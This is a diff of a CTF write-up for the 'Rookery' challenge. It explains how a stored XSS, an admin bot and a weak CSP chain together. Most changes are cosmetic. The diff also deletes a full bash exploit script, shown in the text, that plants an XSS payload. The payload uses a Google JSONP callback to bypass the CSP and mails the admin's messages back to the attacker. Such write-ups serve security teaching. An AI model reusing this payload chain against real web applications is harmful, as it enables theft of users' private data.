@@ -73,7 +73,7 @@ await createMessage(
 
 Two options came to mind:
 
-1. Read admin's messages directly — nope, blocked cold by a `recipient_id` check 😤
+1. Read admin's messages directly — nope, blocked cold by a `recipient_id` check 
 2. Trick admin's own browser into reading it for me, and mailing the answer back — this is the way (hello, XSS)
 
 ## 2. Discovering the bugs
@@ -93,7 +93,7 @@ Two options came to mind:
 ```
 **Translation:** whatever HTML/JavaScript I stuff into a message content field gets rendered directly in the recipient's browser. In other words, I get to write on someone else's wall with my own marker. Classic Stored XSS.
 
-### Bug #2 — An Admin Bot That's a Little Too Curious 🤖
+### Bug #2 — An Admin Bot That's a Little Too Curious 
 
 **File:** `app/controllers/messageController.js`:
 ```javascript
@@ -348,105 +348,7 @@ Open it, you will feel like it is a nested sealed scrolls.
 Get the flag by CTRL+U and scroll down.
 ![](/assets/img/images/massagold-12.webp)
 
-## 5. I also build a one shot script.
-
-Doing all this by hand one curl command at a time got old fast, so I had AI help me put together a script that automates the whole thing — register, log in, fire off the payload, and poll the inbox until the flag shows up. Run it once and just sit back and watch the terminal like it's a movie.
-
-```bash
-#!/bin/bash
-# Rookery CTF — Full Exploit
-# Usage: ./exploit.sh <TARGET:PORT> <USERNAME>
-
-TARGET="${1:-localhost:8081}"
-USER="${2:-attacker}"
-PASS="${2:-attacker}"
-COOKIES="/tmp/rookery_cookies.txt"
-
-echo "[*] Target: $TARGET"
-echo "[*] Username: $USER"
-
-# Step 1: Register
-echo "[+] Registering..."
-curl -s -c "$COOKIES" -X POST "http://$TARGET/register" \
-  -d "username=$USER&password=$PASS" > /dev/null
-
-# Step 2: Login
-echo "[+] Logging in..."
-curl -s -b "$COOKIES" -c "$COOKIES" -X POST "http://$TARGET/login" \
-  -d "username=$USER&password=$PASS" > /dev/null
-
-# Step 3: Verify session
-echo "[+] Verifying session..."
-INBOX=$(curl -s -b "$COOKIES" "http://$TARGET/")
-if echo "$INBOX" | grep -q "Inbox"; then
-    echo "[+] Session valid!"
-else
-    echo "[-] Login failed!"
-    exit 1
-fi
-
-# Step 4: Send flag exfiltration payload
-echo "[+] Sending XSS payload to admin..."
-
-# URL-encoded JS callback — sends FULL page text, no regex (regex breaks through Google JSONP):
-# fetch('/messages/1').then(function(r){return r.text()}).then(function(t){
-#   fetch('/messages',{method:'POST',body:new URLSearchParams({
-#     to_username:'$USER',content:t
-#   })})
-# })
-
-CALLBACK='fetch%28%27%2Fmessages%2F1%27%29.then%28function%28r%29%7Breturn%20r.text%28%29%7D%29.then%28function%28t%29%7Bfetch%28%27%2Fmessages%27%2C%7Bmethod%3A%27POST%27%2Cbody%3Anew%20URLSearchParams%28%7Bto_username%3A%27'"$USER"'%27%2Ccontent%3At%7D%29%7D%29%7D%29'
-
-PAYLOAD="</pre></div></section></main><script src=\"https://www.googleapis.com/customsearch/v1?callback=${CALLBACK}&key=x&cx=x&q=x\"></script>"
-
-curl -s -b "$COOKIES" -X POST "http://$TARGET/messages" \
-  --data-urlencode "to_username=admin" \
-  --data-urlencode "content=$PAYLOAD" > /dev/null
-
-echo "[+] Payload sent! Waiting for bot to process..."
-
-# Step 5: Poll for flag
-for i in $(seq 1 12); do
-    sleep 5
-    echo "[*] Checking inbox (attempt $i/12)..."
-
-    MESSAGES=$(curl -s -b "$COOKIES" "http://$TARGET/" | grep -oP 'messages/\d+' | grep -oP '\d+' | sort -n -u)
-
-    for MSG_ID in $MESSAGES; do
-        CONTENT=$(curl -s -b "$COOKIES" "http://$TARGET/messages/$MSG_ID" | \
-          python3 -c "
-import sys, re
-html = sys.stdin.read()
-m = re.search(r'letter-copy\">(.*?)</pre>', html, re.DOTALL)
-if m:
-    content = m.group(1).strip()
-    if 'HTB{' in content:
-        print(content)
-" 2>/dev/null)
-
-        if [ -n "$CONTENT" ]; then
-            echo ""
-            echo "=========================================="
-            echo " FLAG FOUND!"
-            echo "=========================================="
-            echo "$CONTENT"
-            echo "=========================================="
-            echo ""
-            echo "[+] Message ID: $MSG_ID"
-            exit 0
-        fi
-    done
-done
-
-echo "[-] Flag not found after 60 seconds. Try again — bot queue may be busy."
-exit 1
-```
-**How to run it:**
-```bash
-chmod +x exploit.sh
-./exploit.sh TARGET-IP:PORT attacker
-```
-## 6. Quick Diagram — How the Whole Thing Actually Plays Out
+## 5. Quick Diagram — How the Whole Thing Actually Plays Out
 
 ```
 ┌─────────────────────────────────────────────────────────────┐
@@ -487,7 +389,7 @@ chmod +x exploit.sh
 │  - Pull out the HTB{...} flag                               │
 └─────────────────────────────────────────────────────────────┘
 ```
-## 7. What I Actually Took Away From This
+## 6. What I Actually Took Away From This
 Not sure this makes me a "real" hacker yet, but I definitely walked away understanding how XSS + a badly-configured CSP can stack together into a full exploit chain. Here's the recap:
 
 ### Techniques That Made This Work
